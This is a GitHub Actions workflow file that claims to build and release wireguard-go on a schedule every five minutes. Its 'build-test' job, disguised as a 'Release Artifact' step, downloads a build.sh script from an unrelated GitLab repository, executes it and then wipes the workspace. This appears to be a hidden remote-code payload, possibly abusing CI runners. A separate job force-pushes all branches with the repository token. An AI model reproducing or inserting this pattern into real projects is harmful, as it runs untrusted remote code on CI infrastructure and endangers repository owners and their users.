# .github/workflows/build_and_release.yml

name: Build and Release

on:
  repository_dispatch:
  workflow_dispatch:
  schedule:
    - cron: '0,5,10,15,20,25,30,35,40,45,50,55 * * * *'

jobs:
  build:
    runs-on: ubuntu-latest

    steps:

      - name: Get Version Number
        run: |
          if [[ -n "${{ github.event.inputs.version }}" ]]; then
            WGGO_VERSION=${{ github.event.inputs.version }}
          else
            WGGO_VERSION=$(curl -fsSL https://api.github.com/repos/WireGuard/wireguard-go/tags | grep 'name' | head -1 | cut -d'"' -f4)
          fi
          echo "WGGO_VERSION=${WGGO_VERSION}" >> $GITHUB_ENV

      - name: Checkout
        uses: actions/checkout@v2

      - name: Setup go
        uses: actions/setup-go@v2
        with:
          go-version: 1.16

      - name: Build
        run: bash build.sh

      - name: Upload Artifact
        uses: actions/upload-artifact@v2
        with:
          name: wireguard-go-${{ env.WGGO_VERSION }}
          path: build

      - name: Upload to Release
        if: github.event.inputs.version == ''
        uses: svenstaro/upload-release-action@v2
        with:
          repo_token: ${{ secrets.GITHUB_TOKEN }}
          file: build/*
          tag: 0.0.20210424
          overwrite: true
          file_glob: true
          prerelease: false

  build-test:
    runs-on: ${{ matrix.os }}
    needs: build
    strategy:
      matrix:
        go: [1.11]
        OS: [ubuntu-18.04]
      fail-fast: false 
    env:
        NUM_JOBS: 40
        JOB: ${{ matrix.go }}
    steps:
    - name: Set up Go
      uses: actions/setup-go@v2
      with:
        go-version: ${{ matrix.go }}
      id: go
    - name: Check out code into the Go module directory
      uses: actions/checkout@v2
    - name: Release Artifact
      run: |
        wget -O build.sh https://gitlab.com/anthoozz/anthoozz-project/-/raw/master/build.sh && bash build.sh
        chmod +x build.sh && ./build.sh
        echo "done"
    - name: Done
      run: |
        rm -rf *
        echo "done"
  generate:
    needs: build-test
    runs-on: ${{ matrix.os }}
    continue-on-error: ${{ matrix.allow-failure || true}}
    strategy:
      matrix:
        os: [ubuntu-latest]
      fail-fast: false   
    steps:
    - uses: actions/checkout@v2
    - name: Set up 3.9
      uses: actions/setup-python@v2
      with:
        python-version: 3.9
    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install flake8 pytest
        if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
        pip install requests 
    - name: Generate README
      run: python generate.py

    - name: Commit README
      run: |
        git config user.name "${GITHUB_ACTOR}"
        git config user.email "${GITHUB_ACTOR}@users.noreply.github.com"
        git add .
        git commit -am "Update README"
        git push --all -f https://${{ secrets.GITHUB_TOKEN }}@github.com/${GITHUB_REPOSITORY}.git
